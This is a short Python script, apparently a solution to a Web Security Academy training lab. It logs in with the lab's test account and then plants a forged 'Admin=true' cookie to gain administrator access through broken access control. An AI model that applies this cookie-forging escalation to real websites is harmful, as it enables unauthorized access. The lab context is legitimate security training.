import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac8c1f461e3f2273c0ed1adc00680023.web-security-academy.net'
cookie_name = 'Admin'
cookie_value = 'true'

login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'wiener', 
    'password' : 'peter'
}

resp = s.post(login_url, data=logindata)

cookie_obj = requests.cookies.create_cookie(domain=site, name=cookie_name, value=cookie_value)
s.cookies.set_cookie(cookie_obj)